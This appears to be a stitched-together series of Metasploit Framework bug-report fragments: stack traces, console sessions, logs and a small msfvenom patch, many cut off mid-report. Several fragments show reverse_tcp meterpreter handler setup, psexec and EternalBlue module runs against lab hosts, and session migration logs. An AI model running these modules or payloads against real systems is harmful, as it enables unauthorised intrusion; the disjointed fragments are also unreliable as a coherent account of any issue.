/users/asoto/git/r7/metasploit-framework/lib/msf/base/simple/exploit.rb:161:in `exploit_simple'
/users/asoto/git/r7/metasploit-framework/lib/msf/ui/console/command_dispatcher/exploit.rb:110:in `cmd_exploit'
/users/asoto/git/r7/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:548:in `run_command'
/users/asoto/git/r7/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:510:in `block in run_single'
/users/asoto/git/r7/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:504:in `each'
/users/asoto/git/r7/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:504:in `run_single'
/users/asoto/git/r7/metasploit-framework/lib/msf/ui/console/driver.rb:224:in `block in initialize'
/users/asoto/git/r7/metasploit-framework/lib/msf/ui/console/driver.rb:223:in `each'
/users/asoto/git/r7/metasploit-framework/lib/msf/ui/console/driver.rb:223:in `initialize'
/users/asoto/git/r7/metasploit-framework/lib/metasploit/framework/command/console.rb:62:in `new'
/users/asoto/git/r7/metasploit-framework/lib/metasploit/framework/command/console.rb:62:in `driver'
/users/asoto/git/r7/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
/users/asoto/git/r7/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
./msfconsole:48:in `<main>'
``` ## system stuff
msf sees a session for a moment, then it is gone.
meterpreter > [*] meterpreter session 2 opened (pivot via [192.168.42.42:8443 -> 192.168.42.2:52944]) at 2018-04-22 06:09:50 +0200
[*] - meterpreter session 2 closed.
``` middle process crashes:
0000000000158050 | 48 83 ec 38 | sub rsp,38 |
0000000000158054 | 4c 89 4c 24 28 | mov qword ptr ss:[rsp+28],r9 |
0000000000158059 | 44 89 44 24 20 | mov dword ptr ss:[rsp+20],r8d |
000000000015805e | 44 8b 41 28 | mov r8d,dword ptr ds:[rcx+28] | <============ rcx is 0
0000000000158062 | 44 8b ca | mov r9d,edx |
0000000000158065 | 48 8b 51 20 | mov rdx,qword ptr ds:[rcx+20] |
0000000000158069 | e8 5a 07 00 00 | call 1587c8 |
000000000015806e | 48 83 c4 38 | add rsp,38 |
0000000000158072 | c3 | ret |
``` ## system stuff
msf5 exploit(multi/handler) > run [*] started bind pipe handler
[-] failed to connect socket 127.0.0.1:445
msf5 > #<thread: @/users/asoto/git/r7/metasploit-framework/lib/msf/core/thread_manager.rb:93 run> terminated with exception (report_on_exception is true):
traceback (most recent call last): 1: from /users/asoto/git/r7/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'
/users/asoto/git/r7/metasploit-framework/lib/msf/core/handler/bind_named_pipe.rb:306:in `block in start_handler': unexpected return (localjumperror)
``` in the above example, the loopback interface is not listening on `:445`, so the command fails
but the `thread_manager` has an unhandled `localjumperror` exception)
in addition, the command hangs and must be ctrl-c'ed
## system stuff
the smb session is aborted by the target when it realizes that smb2 isn't possible
surprisingly, there is no response packet indicating an error
the tcp connection is just forcibly reset
see below for a side-by-side comparison of current vs expected behavior
left is metasploit's `simpleclient::login()`
right is known-good os x smb implementation: ![screen shot 2018-04-18 at 2 28 34 pm]( we get a traceback in the case of either error, but because of over-zealous exception handling, we get back a 'login failed' error, but not enough information to know why: ```
[-] smb login failure .\\username:password 192.168.108.217:445
``` modifying `metasploit-framework/lib/msf/core/handler/bind_named_pipe.rb:317` to not catch every exception gives us a more helpful traceback: ```
#<thread: @/users/asoto/git/r7/metasploit-framework/lib/msf/core/thread_manager.rb:93 run> terminated with exception (report_on_exception is true):
traceback (most recent call last): 3: from /users/asoto/git/r7/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn' 2: from /users/asoto/git/r7/metasploit-framework/lib/msf/core/handler/bind_named_pipe.rb:313:in `block in start_handler' 1: from /users/asoto/git/r7/metasploit-framework/lib/rex/proto/smb/simpleclient.rb:45:in `login'
/users/asoto/git/r7/metasploit-framework/lib/rex/proto/smb/simpleclient.rb:85:in `rescue in login': login failed: connection reset by peer (rex::proto::smb::exceptions::loginerror)
``` ## system stuff
metasploit-framework (s:0 j:1) payload(python/meterpreter/reverse_tcp) > use payload/linux/x64/meterpreter/reverse_tcp
metasploit-framework (s:0 j:1) payload(linux/x64/meterpreter/reverse_tcp) > show options module options (payload/linux/x64/meterpreter/reverse_tcp): name current setting required description ---- --------------- -------- ----------- lhost yes the listen address lport 4444 yes the listen port metasploit-framework (s:0 j:1) payload(linux/x64/meterpreter/reverse_tcp) > set lhost 192.168.254.130 lhost => 192.168.254.130
metasploit-framework (s:0 j:1) payload(linux/x64/meterpreter/reverse_tcp) > to_handler [-] [2018.04.14-17:59:58] exploit failed: invalid opcode arguments "push", allowed : [[:reg], [:modrm], [:i], [:i8], [:seg3a]] near "push" at "\\"<unk>\\"" line 17
[*] payload handler started as job metasploit-framework (s:0 j:1) payload(linux/x64/meterpreter/reverse_tcp) >
## system stuff
no platform was selected, choosing msf::module::platform::windows from the payload
no arch selected, selecting arch: x86 from the payload
no encoders or badchars specified, outputing raw payload
payload size:333 bytes
error: undefined method 'map' for nil:nilclass
did you mean? tap ## system stuff
an ugly traceback
(see above.) ## system stuff
evidence is left on disk
**note**: counterinuitively, in the event that you turn cmdout off, a zero-byte file is written to disk and left behind
## system stuff
initial connection will come in, but session immediately dies; no further requests come in
## system stuff
metasploit fail to write into /home/msf/.msf4/ when the file is shared with /home/<user>/.msf4/ (see docker-compose.yml) ```
core@my_vm01 ~ $ sudo docker-compose run --rm --service-ports -e msf_uid=$(id -u) -e msf_gid=$(id -g) ms
starting core_db_1 ..
rails error: unable to access log file
please ensure that /home/msf/.msf4/logs/production.log exists and is writable (ie, make it writable for user and group: chmod 0664 /home/msf/.msf4/logs/production.log)
the log level has been raised to warn and the output directed to stderr until the problem is fixed.
traceback (most recent call last):ork console...\\ 16: from ./msfconsole:49:in `<main>' 15: from /usr/src/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start' 14: from /usr/src/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start' 13: from /usr/src/metasploit-framework/lib/metasploit/framework/command/console.rb:62:in `driver' 12: from /usr/src/metasploit-framework/lib/metasploit/framework/command/console.rb:62:in `new' 11: from /usr/src/metasploit-framework/lib/msf/ui/console/driver.rb:74:in `initialize' 10: from /usr/src/metasploit-framework/lib/msf/base/simple/framework.rb:73:in `create' 9: from /usr/src/metasploit-framework/lib/msf/base/simple/framework.rb:110:in `simplify' 8: from /usr/src/metasploit-framework/lib/msf/base/config.rb:209:in `init' 7: from /usr/src/metasploit-framework/lib/msf/base/config.rb:371:in `init' 6: from /usr/local/lib/ruby/2.5.0/fileutils.rb:193:in `mkdir_p' 5: from /usr/local/lib/ruby/2.5.0/fileutils.rb:193:in `each' 4: from /usr/local/lib/ruby/2.5.0/fileutils.rb:208:in `block in mkdir_p' 3: from /usr/local/lib/ruby/2.5.0/fileutils.rb:208:in `reverse_each' 2: from /usr/local/lib/ruby/2.5.0/fileutils.rb:210:in `block (2 levels) in mkdir_p' 1: from /usr/local/lib/ruby/2.5.0/fileutils.rb:232:in `fu_mkdir'
/usr/local/lib/ruby/2.5.0/fileutils.rb:232:in `mkdir': permission denied @ dir_s_mkdir - /home/msf/.msf4/logs (errno::eacces)
``` you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
the container can't found db_connect : ```
$ sudo docker-compose run --rm --service-ports -e msf_uid=$(id -u) -e msf_gid=$(id -g) ms
starting msf_db_1 ..
[-] ***rting the metasploit framework console...-
[-] * warning: no database support: nilclass [-] *** ______________________________________________________________________________
| 3kom superhack ii logon |
|______________________________________________________________________________|
| user name: [ security ] |
| password: [ ] |
|______________________________________________________________________________|
| |
|______________________________________________________________________________| =[ metasploit v5.0.0-dev ]
+ -- --=[ 1750 exploits - 1003 auxiliary - 304 post ]
+ -- --=[ 536 payloads - 40 encoders - 10 nops ]
+ -- --=[ ** this is metasploit 5 development branch ** ] [*] processing docker/msfconsole.rc for erb directives.
[*] resource (docker/msfconsole.rc)> ruby code (236 bytes)
lhost => 172.22.0.3
[-] unknown command: db_connect.
``` ## system stuff
you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
traceback (most recent call last): 37: from /usr/bin/msfvenom:321:in `<main>' 36: from /usr/bin/msfvenom:55:in `framework' 35: from /usr/bin/msfvenom:46:in `init_framework' 34: from /usr/share/metasploit-framework/lib/msf/base/simple/framework.rb:73:in `create' 33: from /usr/share/metasploit-framework/lib/msf/base/simple/framework.rb:121:in `simplify' 32: from /usr/share/metasploit-framework/lib/msf/base/simple/framework/module_paths.rb:49:in `init_module_paths' 31: from /usr/share/metasploit-framework/lib/msf/base/simple/framework/module_paths.rb:49:in `each' 30: from /usr/share/metasploit-framework/lib/msf/base/simple/framework/module_paths.rb:50:in `block in init_module_paths' 29: from /usr/share/metasploit-framework/lib/msf/core/module_manager/module_paths.rb:40:in `add_module_path' 28: from /usr/share/metasploit-framework/lib/msf/core/module_manager/module_paths.rb:40:in `each' 27: from /usr/share/metasploit-framework/lib/msf/core/module_manager/module_paths.rb:41:in `block in add_module_path' 26: from /usr/share/metasploit-framework/lib/msf/core/module_manager/loading.rb:117:in `load_modules' 25: from /usr/share/metasploit-framework/lib/msf/core/module_manager/loading.rb:117:in `each' 24: from /usr/share/metasploit-framework/lib/msf/core/module_manager/loading.rb:119:in `block in load_modules' 23: from /usr/share/metasploit-framework/lib/msf/core/modules/loader/base.rb:237:in `load_modules' 22: from /usr/share/metasploit-framework/lib/msf/core/modules/loader/directory.rb:30:in `each_module_reference_name' 21: from /usr/share/metasploit-framework/lib/msf/core/modules/loader/directory.rb:30:in `foreach' 20: from /usr/share/metasploit-framework/lib/msf/core/modules/loader/directory.rb:40:in `block in each_module_reference_name' 19: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-core-0.1.13/lib/rex/file.rb:132:in `find' 18: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-core-0.1.13/lib/rex/file.rb:132:in `catch' 17: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-core-0.1.13/lib/rex/file.rb:133:in `block in find' 16: from /usr/share/metasploit-framework/lib/msf/core/modules/loader/directory.rb:50:in `block (2 levels) in each_module_reference_name' 15: from /usr/share/metasploit-framework/lib/msf/core/modules/loader/base.rb:238:in `block in load_modules' 14: from /usr/share/metasploit-framework/lib/msf/core/modules/loader/base.rb:183:in `load_module' 13: from /usr/share/metasploit-framework/lib/msf/core/module_manager/loading.rb:73:in `on_module_load' 12: from /usr/share/metasploit-framework/lib/msf/core/payload_set.rb:198:in `add_module' 11: from /usr/share/metasploit-framework/lib/msf/core/payload_set.rb:198:in `new' 10: from /usr/share/metasploit-framework/modules/payloads/stages/python/meterpreter.rb:25:in `initialize' 9: from /usr/share/metasploit-framework/lib/msf/core/payload/python/meterpreter_loader.rb:45:in `initialize' 8: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/activesupport-4.2.10/lib/active_support/dependencies.rb:274:in `require' 7: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/activesupport-4.2.10/lib/active_support/dependencies.rb:240:in `load_dependency' 6: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/activesupport-4.2.10/lib/active_support/dependencies.rb:274:in `block in require' 5: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/backports-3.11.1/lib/backports/std_lib.rb:9:in `require_with_backports' 4: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/backports-3.11.1/lib/backports/std_lib.rb:9:in `require' 3: from /usr/share/metasploit-framework/lib/msf/core/opt.rb:3:in `<top (required)>' 2: from /usr/share/metasploit-framework/lib/msf/core/opt.rb:16:in `<module:msf>' 1: from /usr/share/metasploit-framework/lib/msf/core/opt.rb:111:in `<module:opt>'
/usr/share/metasploit-framework/lib/msf/core/opt.rb:57:in `sslversion': undefined method `supported_ssl_methods' for rex::socket::ssltcp:module (nomethoderror)
``` you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
following errors occurred.
- post failed: nomethoderror undefined method '[]' for nil:nilclass
- post failed: nomethoderror undefined method 'join' for nil:nilclass ## system stuff
i tested on vmware fusion environment and physical pc environment
but, both of environments, same errors occurred.
wireshark shows a udp packet coming to 4444 on the msf box, but no response and no further activity from msf.
[03/30/2018 22:12:53] [e(0)] core: exception raised from handle_connection: nameerror: undefined local variable or method `opts' for #<#<class: >: > /opt/sj/metasploit-framework/lib/msf/core/payload/transport_config.rb:21:in `transport_config_reverse_udp'
/opt/sj/metasploit-framework/lib/msf/core/payload/windows/reverse_udp.rb:41:in `transport_config'
/opt/sj/metasploit-framework/lib/msf/core/payload/windows/meterpreter_loader.rb:85:in `generate_config'
/opt/sj/metasploit-framework/lib/msf/core/payload/windows/meterpreter_loader.rb:71:in `stage_payload'
/opt/sj/metasploit-framework/lib/msf/core/payload/stager.rb:150:in `generate_stage'
/opt/sj/metasploit-framework/lib/msf/core/payload/stager.rb:177:in `handle_connection'
/opt/sj/metasploit-framework/lib/msf/core/handler/reverse_udp.rb:199:in `block (2 levels) in start_handler'
/opt/sj/metasploit-framework/lib/msf/core/handler/reverse_udp.rb:175:in `loop'
/opt/sj/metasploit-framework/lib/msf/core/handler/reverse_udp.rb:175:in `block in start_handler'
/opt/sj/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'
``` ## system stuff
it fails with :
traceback (most recent call last): 8: from /usr/bin/msfvenom:287:in `<main>' 7: from /usr/bin/msfvenom:174:in `parse_args' 6: from /usr/lib/ruby/2.5.0/optparse.rb:1648:in `parse!' 5: from /usr/lib/ruby/2.5.0/optparse.rb:1626:in `permute!' 4: from /usr/lib/ruby/2.5.0/optparse.rb:1532:in `order!' 3: from /usr/lib/ruby/2.5.0/optparse.rb:1538:in `parse_in_order' 2: from /usr/lib/ruby/2.5.0/optparse.rb:1538:in `catch' 1: from /usr/lib/ruby/2.5.0/optparse.rb:1584:in `block in parse_in_order'
/usr/bin/msfvenom:138:in `block in parse_args': uninitialized constant rex (nameerror)
``` ## other informations
i noticed that the code of msfvenom has changed
the line ```'require rex'``` has moved into the function require_deps.
rex is not loaded before use in parse_args
i fixed it in the package, version 4.16.46-0kali1 with the following patch, but you probably want to fix it in another way
--- a/msfvenom
+++ b/msfvenom
@@ -60,6 +60,8 @@ end def parse_args(args) opts = {} datastore = {}
+ # load dependencies (require rex)
+ require_deps unless @framework_loaded opt = optionparser.new banner = "msfvenom - a metasploit standalone payload generator.\ " banner << "also a replacement for msfpayload and msfencode.\ "
``` ## system stuff
we are currently depending on deprecated gems
## system stuff
msf5 exploit(windows/smb/psexec) > set lport 30001
lport => 30001
msf5 exploit(windows/smb/psexec) > run [*] started bind pipe handler
[*] 192.168.16.102:445 - connecting to the server...
[-] failed to connect socket 192.168.16.102:30001
[*] 192.168.16.102:445 - authenticating to 192.168.16.102:445 as user 'vagrant'...
[*] 192.168.16.102:445 - selecting powershell target
[*] 192.168.16.102:445 - executing the payload...
[+] 192.168.16.102:445 - service start timed out, ok if running a command or non-service executable...
[*] exploit completed, but no session was created.
``` ## system stuff
what happens instead is that the link can not be opened in the safari browser in my iphone and the session is therefore not created ## system stuff
the udf crashes the mysql server
## system stuff
the binary seems to fail to connect back to the listener and windows 7 throws an error ![capture]( ## system stuff
**attacker machine**
root@hacknetos:~# uname -a
linux hacknetos 4.14.0-kali3-amd64 #1 smp debian 4.14.17-1kali1 (2018-02-16) x86_64 gnu/linux
root@hacknetos:~# lsb_release -a
no lsb modules are available.
distributor id: kali
description: kali gnu/linux rolling
release: kali-rolling
codename: kali-rolling
**victim machine**
microsoft windows 7 ultimate service pack 1 build 7601 6.1.7601
[-] post failed: eoferror eoferror
[-] call stack:
[-] /usr/share/metasploit-framework/lib/rex/post/meterpreter/channels/pool.rb:84:in `read'
[-] /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/fs/io.rb:25:in `sysread'
[-] /usr/share/metasploit-framework/lib/msf/core/post/file.rb:431:in `_read_file_meterpreter'
[-] /usr/share/metasploit-framework/lib/msf/core/post/file.rb:281:in `read_file'
[-] /usr/share/metasploit-framework/modules/post/windows/manage/run_as.rb:115:in `run' ## system stuff
metasploit gets moved to c:\\metasploit-framework\\ ### i installed metasploit with: ### os windows 10 pro x64
[-] 10.x.x.x:139 - rangeerror
[-] 10.x.x.x:139 - bignum too big to convert into `long'
[-] 10.x.x.x:139 - <internal:prelude>:76:in `__read_nonblock'
<internal:prelude>:76:in `read_nonblock'
/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/rex-core-0.1.12/lib/rex/io/stream.rb:72:in `read'
/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/ruby_smb-0.0.18/lib/ruby_smb/dispatcher/socket.rb:54:in `recv_packet'
/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/ruby_smb-0.0.18/lib/ruby_smb/client.rb:229:in `send_recv'
/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/ruby_smb-0.0.18/lib/ruby_smb/client/negotiation.rb:36:in `negotiate_request'
/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/ruby_smb-0.0.18/lib/ruby_smb/client/negotiation.rb:14:in `negotiate'
/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/ruby_smb-0.0.18/lib/ruby_smb/client.rb:186:in `login'
/usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_eternalblue.rb:310:in `smb1_anonymous_connect_ipc'
/usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_eternalblue.rb:166:in `smb_eternalblue'
/usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_eternalblue.rb:118:in `block in exploit'
/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/activesupport-4.2.10/lib/active_support/core_ext/range/each.rb:7:in `each'
/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/activesupport-4.2.10/lib/active_support/core_ext/range/each.rb:7:in `each_with_time_with_zone'
/usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_eternalblue.rb:114:in `exploit'
/usr/share/metasploit-framework/lib/msf/core/exploit_driver.rb:206:in `job_run_proc'
/usr/share/metasploit-framework/lib/msf/core/exploit_driver.rb:167:in `run'
/usr/share/metasploit-framework/lib/msf/base/simple/exploit.rb:136:in `exploit_simple'
/usr/share/metasploit-framework/lib/msf/base/simple/exploit.rb:161:in `exploit_simple'
/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/exploit.rb:110:in `cmd_exploit'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:548:in `run_command'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:510:in `block in run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:504:in `each'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:504:in `run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:206:in `run'
/usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
/usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
/usr/bin/msfconsole:48:in `<main>'
``` ## system stuff
the module reports the target as vulnerable to cve-2016-6415
the module implementation incorrectly assumes the ikev1 notification message header to be 36 bytes long, even though the correct length is 40
in ikev2, it is 36 bytes.
migrate 3264 [*] migrating from 3640 to 3264...
[!] migration: pid = 3264
[!] migration: writable_dir = [!] migration: opts = {:timeout=>nil}
[-] error running command migrate: rex::timeouterror operation timed out.
here and below additional debug information added by me
this moment in `/opt/metasploit/apps/pro/engine/config/logs/framework.log`
[02/06/2018 19:57:43] [e(0)] core: send_request
[02/06/2018 19:57:43] [e(0)] core: packet=nil
[02/06/2018 19:57:43] [e(0)] core: timeout=nil
[02/06/2018 19:57:43] [e(0)] core: send_packet_wait_response
[02/06/2018 19:57:43] [e(0)] core: packet=#<rex::post::meterpreter::packet type=request tlvs=[ #<rex::post::meterpreter::tlv type=method meta=string value="core_negotiate_tlv_encryption"> #<rex::post::meterpreter::tlv type=request-id meta=string value="19440903037005434623340406204269"> #<rex::post::meterpreter::tlv type=rsa-pub-key meta=string value="-----begin public key-----\ miibijanbgkqhkig9w0ba ...">
[02/06/2018 19:57:43] [e(0)] core: timeout=300
[02/06/2018 19:57:43] [e(0)] core: add_response_waiter
[02/06/2018 19:57:43] [e(0)] core: request=#<rex::post::meterpreter::packet type=request tlvs=[ #<rex::post::meterpreter::tlv type=method meta=string value="core_negotiate_tlv_encryption"> #<rex::post::meterpreter::tlv type=request-id meta=string value="19440903037005434623340406204269"> #<rex::post::meterpreter::tlv type=rsa-pub-key meta=string value="-----begin public key-----\ miibijanbgkqhkig9w0ba ...">
[02/06/2018 19:57:43] [e(0)] core: completion_routine=nil
[02/06/2018 19:57:43] [e(0)] core: completion_param=nil
[02/06/2018 19:57:43] [e(0)] core: waiter=#<rex::post::meterpreter::packetresponsewaiter: @rid="19440903037005434623340406204269", @response=nil, @mutex=#<thread::mutex: >, @cond=#<thread::conditionvariable: >>
[02/06/2018 19:57:43] [e(0)] core: send_packet
[02/06/2018 19:57:43] [e(0)] core: packet=#<rex::post::meterpreter::packet type=request tlvs=[ #<rex::post::meterpreter::tlv type=method meta=string value="core_negotiate_tlv_encryption"> #<rex::post::meterpreter::tlv type=request-id meta=string value="19440903037005434623340406204269"> #<rex::post::meterpreter::tlv type=rsa-pub-key meta=string value="-----begin public key-----\ miibijanbgkqhkig9w0ba ...">
[02/06/2018 19:57:43] [e(0)] core: opts={}
[02/06/2018 19:57:43] [e(0)] core: bytes_written=571
[02/06/2018 20:02:43] [e(0)] core: response=nil
[02/06/2018 20:02:43] [e(0)] core: remove_response_waiter
[02/06/2018 20:02:43] [e(0)] core: waiter=#<rex::post::meterpreter::packetresponsewaiter: @rid="19440903037005434623340406204269", @response=nil, @mutex=#<thr
ead::mutex: >, @cond=#<thread::conditionvariable: >>
[02/06/2018 20:02:43] [e(0)] meterpreter: error running command migrate: rex::timeouterror operation timed out.
[02/06/2018 20:02:43] [d(0)] meterpreter: call stack:
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.16.13/lib/rex/post/meterpreter/packet_dispatcher.rb:235:in `send_request'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.16.13/lib/rex/post/meterpreter/client_core.rb:723:in `negotiate_tlv_encryption'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.16.13/lib/rex/post/meterpreter/client_core.rb:664:in `migrate'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.16.13/lib/rex/post/meterpreter/ui/console/command_dispatcher/core.rb:1117:in `cmd_migrate'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.16.13/lib/rex/ui/text/dispatcher_shell.rb:430:in `run_command'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.16.13/lib/rex/post/meterpreter/ui/console.rb:105:in `run_command'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.16.13/lib/rex/ui/text/dispatcher_shell.rb:392:in `block in run_single'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.16.13/lib/rex/ui/text/dispatcher_shell.rb:386:in `each'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.16.13/lib/rex/ui/text/dispatcher_shell.rb:386:in `run_single'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.16.13/lib/msf/core/rpc/v10/rpc_session.rb:290:in `block in rpc_meterpreter_write'
/opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.16.13/lib/msf/core/thread_manager.rb:100:in `block in spawn'
``` this moment in `tshark` on msf host
70 18.041402976 10.211.55.14 10.211.55.7 tcp 625 4444 49175 [psh, ack] seq=119969 ack=15185 win=1041 len=571
71 18.248237776 10.211.55.7 10.211.55.14 tcp 54 49175 4444 [ack] seq=15185 ack=120540 win=16282 len=0
72 20.011203547 10.211.55.7 10.211.55.14 tcp 477 49175 4444 [psh, ack] seq=15185 ack=120540 win=16282 len=423
73 20.011238866 10.211.55.14 10.211.55.7 tcp 54 4444 49175 [ack] seq=120540 ack=15608 win=1064 len=0
``` this moment in `metsrv` debug log from win target
[2672] [3a8] [command exec] attempting to locate base command core_negotiate_tlv_encryption [2672] [3a8] [command exec] attempting to locate extension command core_negotiate_tlv_encryption (0000000007996bc0) [2672] [3a8] [command exec] couldn't find extension command core_negotiate_tlv_encryption [2672] [3a8] [dispatch] executing in thread: core_negotiate_tlv_encryption [2672] [3a8] [dispatch] created command_process_thread , handle= [2672] [3a8] [dispatch] command_process result: continue [2672] [1e8] [command] executing in thread 0000000004217b00 [2672] [1e8] [command] about to execute inline -> commands: 00000000043578e0 command1: 000000000468cf28 command2: 0000000000000000 [2672] [1e8] [command] executing command core_negotiate_tlv_encryption [2672] [1e8] [pkt find] looking for type 0 [2672] [1e8] [pkt find] tlv header length: 38 [2672] [1e8] [pkt find] tlv header type: 65537 [2672] [1e8] [pkt find] found! [2672] [1e8] [pkt find] looking for type 0 [2672] [1e8] [pkt find] tlv header length: 38 [2672] [1e8] [pkt find] tlv header type: 65537 [2672] [1e8] [pkt find] wrong index, skipping
[2672] [1e8] [pkt find] tlv header length: 41 [2672] [1e8] [pkt find] tlv header type: 65538 [2672] [1e8] [pkt find] found! [2672] [1e8] [pkt find] looking for type 0 [2672] [1e8] [pkt find] tlv header length: 38 [2672] [1e8] [pkt find] tlv header type: 65537 [2672] [1e8] [pkt find] wrong index, skipping
[2672] [1e8] [pkt find] tlv header length: 41 [2672] [1e8] [pkt find] tlv header type: 65538 [2672] [1e8] [pkt find] wrong index, skipping
[2672] [1e8] [pkt find] tlv header length: 460 [2672] [1e8] [pkt find] tlv header type: 66086 [2672] [1e8] [pkt find] found! [2672] [1e8] [pkt find] looking for type 0 [2672] [1e8] [pkt find] tlv header length: 38 [2672] [1e8] [pkt find] tlv header type: 65537 [2672] [1e8] [pkt find] wrong index, skipping
[2672] [1e8] [pkt find] tlv header length: 41 [2672] [1e8] [pkt find] tlv header type: 65538 [2672] [1e8] [pkt find] wrong index, skipping
[2672] [1e8] [pkt find] tlv header length: 460 [2672] [1e8] [pkt find] tlv header type: 66086 [2672] [1e8] [pkt find] wrong index, skipping
[2672] [1e8] [pkt find] reached end of packet buffer [2672] [1e8] [dispatch] packet type for core_negotiate_tlv_encryption is 0 [2672] [1e8] [dispatch] executing request handler core_negotiate_tlv_encryption [2672] [1e8] [pkt find] looking for type 65537 [2672] [1e8] [pkt find] tlv header length: 38 [2672] [1e8] [pkt find] tlv header type: 65537 [2672] [1e8] [pkt find] found! [2672] [1e8] [pkt find] looking for type 65538 [2672] [1e8] [pkt find] tlv header length: 38 [2672] [1e8] [pkt find] tlv header type: 65537 [2672] [1e8] [pkt find] types don't match, skipping
[2672] [1e8] [pkt find] tlv header length: 41 [2672] [1e8] [pkt find] tlv header type: 65538 [2672] [1e8] [pkt find] found! [2672] [1e8] [enc] acquiring crypto context [2672] [1e8] [enc] managed to acquire the crypt context 0! [2672] [1e8] [enc] generating random key..
[2672] [1e8] [enc] inporting random key..
[2672] [1e8] [pkt find] looking for type 66086 [2672] [1e8] [pkt find] tlv header length: 38 [2672] [1e8] [pkt find] tlv header type: 65537 [2672] [1e8] [pkt find] types don't match, skipping
[2672] [1e8] [pkt find] tlv header length: 41 [2672] [1e8] [pkt find] tlv header type: 65538 [2672] [1e8] [pkt find] types don't match, skipping
[2672] [1e8] [pkt find] tlv header length: 460 [2672] [1e8] [pkt find] tlv header type: 66086 [2672] [1e8] [pkt find] found! [2672] [1e8] [enc] required size for the binary key is: 294 (126) [2672] [1e8] [enc] key algo: 1.2.840.113549.1.1.1 [2672] [1e8] [enc] created the rsa provider with crypt_verifycontext [2672] [1e8] [enc] encrypted data length: 256 (100) [2672] [1e8] [enc] encryption witih rsa succeded, byteswapping because ms is stupid and does stuff in little endian
[2672] [1e8] [enc] transmitiing response..
[2672] [1e8] [transmit] sending packet to the server [2672] [1e8] [pkt find] looking for type 65538 [2672] [1e8] [pkt find] tlv header length: 38 [2672] [1e8] [pkt find] tlv header type: 65537 [2672] [1e8] [pkt find] types don't match, skipping
[2672] [1e8] [pkt find] tlv header length: 41 [2672] [1e8] [pkt find] tlv header type: 65538 [2672] [1e8] [pkt find] found! [2672] [1e8] [packet] unencrypted packet length: 391 [2672] [1e8] [packet] unencrypted packet data: 000000000000000000000000041ba3a0 [2672] [1e8] [enc] preparing for encryption ..
[2672] [1e8] [enc] context is valid, moving on ..
